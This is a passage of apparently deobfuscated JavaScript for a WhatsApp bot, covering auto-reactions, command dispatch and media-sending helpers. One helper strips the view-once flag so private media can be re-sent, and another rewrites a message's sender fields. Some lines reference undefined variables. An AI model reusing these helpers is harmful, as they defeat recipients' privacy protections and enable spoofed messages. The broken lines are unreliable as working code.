"🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝", "😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌", "😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔", "🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩", "🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂", "📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔", "❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭", "👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴", "🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥", "🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾", "🏀", "🏈", "🎯", "🏆", "??", "⬆️", "⬇️", "⇒", "⇐", "↩️", "↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵", "🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️", "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿", "🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊", "🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎", "🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖", "🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘", "🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️", "🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨", "🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦", "🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚", "🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖", "🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚", "😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒", "🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷", "🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫", "🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁", "☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰", "😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫", "🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩", "🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋", "💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣", "💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋", "🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀", "🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦", "👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️", "🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️", "🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦", "🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂", "💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️", "👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰", "🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️", "🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️", "🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞", "🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️", "💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃", "🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️", "🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️", "🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️", "⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵", "🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️", "🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️", "🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", "💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", "👤", "👥", "🫂", "👣", "🦰", "🦱", "🦳", "🦲", "🐵"];
        const v51 = v50[Math.floor(Math.random() * v50.length)];
        vSms.react(v51);
      }
    }
    if (!v40 && v28 !== v29) {
      if (config2.CUSTOM_REACT === "true") {
        const v52 = (config2.CUSTOM_REACT_EMOJIS || "🥲,😂,👍🏻,🙂,😔").split(",");
        const v53 = v52[Math.floor(Math.random() * v52.length)];
        vSms.react(v53);
      }
    }
    if (!v40 && v28 === v29) {
      if (config2.CUSTOM_REACT === "true") {
        const v54 = (config2.CUSTOM_REACT_EMOJIS || "🥲,😂,👍🏻,🙂,😔").split(",");
        const v55 = v54[Math.floor(Math.random() * v54.length)];
        vSms.react(v55);
      }
    }
    if (!v32 && config2.MODE === "private") {
      return;
    }
    if (!v32 && v26 && config2.MODE === "inbox") {
      return;
    }
    if (!v32 && !v26 && config2.MODE === "groups") {
      return;
    }
    const command = require("./command");
    const v56 = v20 ? v19.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (v20) {
      const v57 = command.commands.find(p13 => p13.pattern === v56) || command.commands.find(p14 => p14.alias && p14.alias.includes(v56));
      if (v57) {
        if (v57.react) {
          vMakeWASocket.sendMessage(v17, {
            react: {
              text: v57.react,
              key: p9.key
            }
          });
        }
        try {
          v57.function(vMakeWASocket, p9, vSms, {
            from: v17,
            quoted: v18,
            body: v19,
            isCmd: v20,
            command: v22,
            args: v23,
            q: v24,
            text: v25,
            isGroup: v26,
            sender: v27,
            senderNumber: v28,
            botNumber2: v33,
            botNumber: v29,
            pushname: v30,
            isMe: v31,
            isOwner: v32,
            isCreator: v43,
            groupMetadata: v34,
            groupName: v35,
            participants: v36,
            groupAdmins: v37,
            isBotAdmins: v38,
            isAdmins: v39,
            reply: vF2
          });
        } catch (_0x31e10d) {
          console.error("[PLUGIN ERROR] " + _0x31e10d);
        }
      }
    }
    command.commands.map(async p15 => {
      if (v19 && p15.on === "body") {
        p15.function(vMakeWASocket, p9, vSms, {
          from: v17,
          l: v,
          quoted: v18,
          body: v19,
          isCmd: v20,
          command: p15,
          args: v23,
          q: v24,
          text: v25,
          isGroup: v26,
          sender: v27,
          senderNumber: v28,
          botNumber2: v33,
          botNumber: v29,
          pushname: v30,
          isMe: v31,
          isOwner: v32,
          isCreator: v43,
          groupMetadata: v34,
          groupName: v35,
          participants: v36,
          groupAdmins: v37,
          isBotAdmins: v38,
          isAdmins: v39,
          reply: vF2
        });
      } else if (p9.q && p15.on === "text") {
        p15.function(vMakeWASocket, p9, vSms, {
          from: v17,
          l: v,
          quoted: v18,
          body: v19,
          isCmd: v20,
          command: p15,
          args: v23,
          q: v24,
          text: v25,
          isGroup: v26,
          sender: v27,
          senderNumber: v28,
          botNumber2: v33,
          botNumber: v29,
          pushname: v30,
          isMe: v31,
          isOwner: v32,
          isCreator: v43,
          groupMetadata: v34,
          groupName: v35,
          participants: v36,
          groupAdmins: v37,
          isBotAdmins: v38,
          isAdmins: v39,
          reply: vF2
        });
      } else if ((p15.on === "image" || p15.on === "photo") && p9.type === "imageMessage") {
        p15.function(vMakeWASocket, p9, vSms, {
          from: v17,
          l: v,
          quoted: v18,
          body: v19,
          isCmd: v20,
          command: p15,
          args: v23,
          q: v24,
          text: v25,
          isGroup: v26,
          sender: v27,
          senderNumber: v28,
          botNumber2: v33,
          botNumber: v29,
          pushname: v30,
          isMe: v31,
          isOwner: v32,
          isCreator: v43,
          groupMetadata: v34,
          groupName: v35,
          participants: v36,
          groupAdmins: v37,
          isBotAdmins: v38,
          isAdmins: v39,
          reply: vF2
        });
      } else if (p15.on === "sticker" && p9.type === "stickerMessage") {
        p15.function(vMakeWASocket, p9, vSms, {
          from: v17,
          l: v,
          quoted: v18,
          body: v19,
          isCmd: v20,
          command: p15,
          args: v23,
          q: v24,
          text: v25,
          isGroup: v26,
          sender: v27,
          senderNumber: v28,
          botNumber2: v33,
          botNumber: v29,
          pushname: v30,
          isMe: v31,
          isOwner: v32,
          isCreator: v43,
          groupMetadata: v34,
          groupName: v35,
          participants: v36,
          groupAdmins: v37,
          isBotAdmins: v38,
          isAdmins: v39,
          reply: vF2
        });
      }
    });
  });
  vMakeWASocket.decodeJid = p16 => {
    if (!p16) {
      return p16;
    }
    if (/:\d+@/gi.test(p16)) {
      let v58 = jidDecode(p16) || {};
      return v58.user && v58.server && v58.user + "@" + v58.server || p16;
    } else {
      return p16;
    }
  };
  vMakeWASocket.copyNForward = async (p17, p18, p19 = false, p20 = {}) => {
    let v59;
    if (p20.readViewOnce) {
      p18.message = p18.message && p18.message.ephemeralMessage && p18.message.ephemeralMessage.message ? p18.message.ephemeralMessage.message : p18.message || undefined;
      v59 = Object.keys(p18.message.viewOnceMessage.message)[0];
      delete (p18.message && p18.message.ignore ? p18.message.ignore : p18.message || undefined);
      delete p18.message.viewOnceMessage.message[v59].viewOnce;
      p18.message = {
        ...p18.message.viewOnceMessage.message
      };
    }
    let v60 = Object.keys(p18.message)[0];
    let v61 = await generateForwardMessageContent(p18, p19);
    let v62 = Object.keys(v61)[0];
    let v63 = {};
    if (v60 != "conversation") {
      v63 = p18.message[v60].contextInfo;
    }
    v61[v62].contextInfo = {
      ...v63,
      ...v61[v62].contextInfo
    };
    const v64 = await generateWAMessageFromContent(p17, v61, p20 ? {
      ...v61[v62],
      ...p20,
      ...(p20.contextInfo ? {
        contextInfo: {
          ...v61[v62].contextInfo,
          ...p20.contextInfo
        }
      } : {})
    } : {});
    await vMakeWASocket.relayMessage(p17, v64.message, {
      messageId: v64.key.id
    });
    return v64;
  };
  vMakeWASocket.downloadAndSaveMediaMessage = async (p21, p22, p23 = true) => {
    let v65 = p21.msg ? p21.msg : p21;
    let v66 = (p21.msg || p21).mimetype || "";
    let v67 = p21.mtype ? p21.mtype.replace(/Message/gi, "") : v66.split("/")[0];
    const v68 = await downloadContentFromMessage(v65, v67);
    let v69 = Buffer.from([]);
    for await (const v70 of v68) {
      v69 = Buffer.concat([v69, v70]);
    }
    let v71 = await fileType.fromBuffer(v69);
    trueFileName = p23 ? p22 + "." + v71.ext : p22;
    await fs2.writeFileSync(trueFileName, v69);
    return trueFileName;
  };
  vMakeWASocket.downloadMediaMessage = async p24 => {
    let v72 = (p24.msg || p24).mimetype || "";
    let v73 = p24.mtype ? p24.mtype.replace(/Message/gi, "") : v72.split("/")[0];
    const v74 = await downloadContentFromMessage(p24, v73);
    let v75 = Buffer.from([]);
    for await (const v76 of v74) {
      v75 = Buffer.concat([v75, v76]);
    }
    return v75;
  };
  vMakeWASocket.sendFileUrl = async (p25, p26, p27, p28, p29 = {}) => {
    let v77 = "";
    let v78 = await axios2.head(p26);
    v77 = v78.headers["content-type"];
    if (v77.split("/")[1] === "gif") {
      return vMakeWASocket.sendMessage(p25, {
        video: await getBuffer(p26),
        caption: p27,
        gifPlayback: true,
        ...p29
      }, {
        quoted: p28,
        ...p29
      });
    }
    let v79 = v77.split("/")[0] + "Message";
    if (v77 === "application/pdf") {
      return vMakeWASocket.sendMessage(p25, {
        document: await getBuffer(p26),
        mimetype: "application/pdf",
        caption: p27,
        ...p29
      }, {
        quoted: p28,
        ...p29
      });
    }
    if (v77.split("/")[0] === "image") {
      return vMakeWASocket.sendMessage(p25, {
        image: await getBuffer(p26),
        caption: p27,
        ...p29
      }, {
        quoted: p28,
        ...p29
      });
    }
    if (v77.split("/")[0] === "video") {
      return vMakeWASocket.sendMessage(p25, {
        video: await getBuffer(p26),
        caption: p27,
        mimetype: "video/mp4",
        ...p29
      }, {
        quoted: p28,
        ...p29
      });
    }
    if (v77.split("/")[0] === "audio") {
      return vMakeWASocket.sendMessage(p25, {
        audio: await getBuffer(p26),
        caption: p27,
        mimetype: "audio/mpeg",
        ...p29
      }, {
        quoted: p28,
        ...p29
      });
    }
  };
  vMakeWASocket.cMod = (p30, p31, p32 = "", p33 = vMakeWASocket.user.id, p34 = {}) => {
    let v80 = Object.keys(p31.message)[0];
    let v81 = v80 === "ephemeralMessage";
    if (v81) {
      v80 = Object.keys(p31.message.ephemeralMessage.message)[0];
    }
    let v82 = v81 ? p31.message.ephemeralMessage.message : p31.message;
    let v83 = v82[v80];
    if (typeof v83 === "string") {
      v82[v80] = p32 || v83;
    } else if (v83.caption) {
      v83.caption = p32 || v83.caption;
    } else if (v83.text) {
      v83.text = p32 || v83.text;
    }
    if (typeof v83 !== "string") {
      v82[v80] = {
        ...v83,
        ...p34
      };
    }
    if (p31.key.participant) {
      p33 = p31.key.participant = p33 || p31.key.participant;
    } else if (p31.key.participant) {
      p33 = p31.key.participant = p33 || p31.key.participant;
    }
    if (p31.key.remoteJid.includes("@s.whatsapp.net")) {
      p33 = p33 || p31.key.remoteJid;
    } else if (p31.key.remoteJid.includes("@broadcast")) {
      p33 = p33 || p31.key.remoteJid;
    }
    p31.key.remoteJid = p30;
    p31.key.fromMe = p33 === vMakeWASocket.user.id;
    return proto.WebMessageInfo.fromObject(p31);
  };
  vMakeWASocket.getFile = async (p35, p36) => {
    let v84;
    let v85 = Buffer.isBuffer(p35) ? p35 : /^data:.*?\/.*?;base64,/i.test(p35) ? Buffer.from(p35.split`,`[1], "base64") : /^https?:\/\//.test(p35) ? await (v84 = await getBuffer(p35)) : fs2.existsSync(p35) ? (v87 = p35, fs2.readFileSync(p35)) : typeof p35 === "string" ? p35 : Buffer.alloc(0);
    let v86 = (await fileType.fromBuffer(v85)) || {
      mime: "application/octet-stream",
      ext: ".bin"
    };
    let v87 = path2.join(__filename, __dirname + new Date() * 1 + "." + v86.ext);
    if (v85 && p36) {
      fs2.promises.writeFile(v87, v85);
    }
    return {
      res: v84,
      filename: v87,
      size: await getSizeMedia(v85),
      ...v86,
      data: v85
    };
  };
  vMakeWASocket.sendFile = async (p37, p38, p39, p40 = {}, p41 = {}) => {
    let v88 = await vMakeWASocket.getFile(p38, true);
    let {
      filename: _0x276dcc,
      size: _0x2d3256,
      ext: _0x509f04,
      mime: _0x2f94cf,
      data: _0x5d080b
    } = v88;
    let v89 = "";
    let v_0x2f94cf = _0x2f94cf;
    let v_0x276dcc = _0x276dcc;
    if (p41.asDocument) {
      v89 = "document";
    }
    if (p41.asSticker || /webp/.test(_0x2f94cf)) {
      let {
        writeExif: _0x220da5
      } = require("./exif.js");
      let v90 = {
        mimetype: _0x2f94cf,
        data: _0x5d080b
      };
      v_0x276dcc = await _0x220da5(v90, {
        packname: Config.packname,
        author: Config.packname,
        categories: p41.categories ? p41.categories : []
      });
      await fs2.promises.unlink(_0x276dcc);
      v89 = "sticker";
      v_0x2f94cf = "image/webp";
    } else if (/image/.test(_0x2f94cf)) {
      v89 = "image";
    } else if (/video/.test(_0x2f94cf)) {
      v89 = "video";
    } else if (/audio/.test(_0x2f94cf)) {
      v89 = "audio";
    } else {
      v89 = "document";
    }
    await vMakeWASocket.sendMessage(p37, {
      [v89]: {
        url: v_0x276dcc
      },
      mimetype: v_0x2f94cf,
      fileName: p39,
      ...p41
    }, {
      quoted: p40,
      ...p41
    });
    return fs2.promises.unlink(v_0x276dcc);
  };
  vMakeWASocket.parseMention = async p42 => {
    return [...p42.matchAll(/@([0-9]{5,16}|0)/g)].map(p43 => p43[1] + "@s.whatsapp.net");
  };
  vMakeWASocket.sendMedia = async (p44, p45, p46 = "", p47 = "", p48 = "", p49 = {}) => {
    let v91 = await vMakeWASocket.getFile(p45, true);
    let {
      mime: _0x108769,
      ext: _0x119c27,
      res: _0x126407,
      data: _0x489f1f,
      filename: _0x37240f
    } = v91;
    if (_0x126407 && _0x126407.status !== 200 || file.length <= 65536) {
      try {
        throw {
          json: JSON.parse(file.toString())
        };
      } catch (_0x462e27) {
        if (_0x462e27.json) {
          throw _0x462e27.json;
        }
      }
    }
    let v92 = "";
    let v_0x108769 = _0x108769;
    let v_0x37240f = _0x37240f;
    if (p49.asDocument) {
      v92 = "document";
    }
    if (p49.asSticker || /webp/.test(_0x108769)) {
      let {
        writeExif: _0x2b3d3b
      } = require("./exif");
      let v93 = {
        mimetype: _0x108769,
        data: _0x489f1f
      };
      v_0x37240f = await _0x2b3d3b(v93, {
        packname: p49.packname ? p49.packname : Config.packname,
        author: p49.author ? p49.author : Config.author,
        categories: p49.categories ? p49.categories : []
      });
      await fs2.promises.unlink(_0x37240f);
      v92 = "sticker";
      v_0x108769 = "image/webp";
    } else if (/image/.test(_0x108769)) {
      v92 = "image";
    } else if (/video/.test(_0x108769)) {
      v92 = "video";
    } else if (/audio/.test(_0x108769)) {
      v92 = "audio";
    } else {
      v92 = "document";
    }
    await vMakeWASocket.sendMessage(p44, {
      [v92]: {
        url: v_0x37240f
      },
      caption: p47,
      mimetype: v_0x108769,
      fileName: p46,
      ...p49
    }, {
      quoted: p48,
      ...p49
    });
    return fs2.promises.unlink(v_0x37240f);
  };
  vMakeWASocket.sendVideoAsSticker = async (p50, p51, p52 = {}) => {
    let v94;
    if (p52 && (p52.packname || p52.author)) {
      v94 = await writeExifVid(p51, p52);
    } else {
      v94 = await videoToWebp(p51);
    }
    await vMakeWASocket.sendMessage(p50, {
      sticker: {
        url: v94
      },
      ...p52
    }, p52);
  };
  vMakeWASocket.sendImageAsSticker = async (p53, p54, p55 = {}) => {
    let v95;
    if (p55 && (p55.packname || p55.author)) {
      v95 = await writeExifImg(p54, p55);
    } else {
      v95 = await imageToWebp(p54);
    }
    await vMakeWASocket.sendMessage(p53, {
      sticker: {
        url: v95
      },
      ...p55
    }, p55);
  };
  vMakeWASocket.sendImage = async (p56, p57, p58 = "", p59 = "", p60) => {
    let v96 = Buffer.isBuffer(p57) ? p57 : /^data:.*?\/.*?;base64,/i.test(p57) ? Buffer.from(p57.split`,`[1], "base64") : /^https?:\/\//.test(p57) ? await await getBuffer(p57) : fs2.existsSync(p57) ? fs2.readFileSync(p57) : Buffer.alloc(0);
    return await vMakeWASocket.sendMessage(p56, {
      image: v96,
      caption: p58,
      ...p60
    }, {
      quoted: p59
    });
  };
  vMakeWASocket.sendButtonText = (p61, p62 = [], p63, p64, p65 = "", p66 = {}) => {
    let v97 = {
      text: p63,
      footer: p64,
      buttons: p62,
      headerType: 2,
      ...p66
    };
    vMakeWASocket.sendMessage(p61, v97, {
      quoted: p65,
      ...p66
    });
  };
  vMakeWASocket.send5ButImg = async (p67, p68 = "", p69 = "", p70, p71 = [], p72, p73 = {}) => {
